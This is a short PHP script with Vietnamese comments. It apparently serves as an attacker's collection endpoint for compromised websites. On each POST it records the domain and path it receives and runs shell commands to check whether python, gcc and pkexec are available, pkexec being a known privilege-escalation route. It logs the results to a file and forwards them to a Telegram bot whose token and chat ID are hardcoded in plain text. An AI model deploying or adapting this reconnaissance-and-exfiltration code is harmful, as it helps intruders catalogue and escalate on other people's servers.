<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['domain'], $data['path'], $data['filename'])) {
        $domain = rtrim($data['domain'], '/'); // Xóa '/' ở cuối
        $path = ltrim($data['path'], '/'); // Xóa '/' ở đầu
        $filename = $data['filename'];
        
        // Lấy ngày giờ hiện tại
        $dateTime = date('d/m/Y H:i:s');

        $file = 'sys.txt';
        // Tạo đường dẫn đầy đủ
        $fullPath = "$domain/$path"; 
        
        // Kiểm tra xem các lệnh có khả dụng không
        $python = (shell_exec('python --help') !== null) ? "ON" : "OFF";
        $gcc = (shell_exec('gcc --help') !== null) ? "ON" : "OFF";
        $pkexec = (shell_exec('pkexec --version') !== null) ? "ON" : "OFF";

        // Chuẩn bị nội dung
        $content = "Domain: $domain\nDate: $dateTime\nFull Path: $fullPath\nPython: $python\nGCC: $gcc\npkexec: $pkexec\n";

        // Ghi vào sys.txt
        file_put_contents($file, "------\n$content", FILE_APPEND);

        // Gửi thông tin tới Telegram
        $chat_id = '7416297295';
        $bot_token = '7201454232:AAEPcn2bfld2FW8X8cEakCKx32kJdygixuI';
        $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($content);
        
        file_get_contents($telegram_url);
    }
}
?>
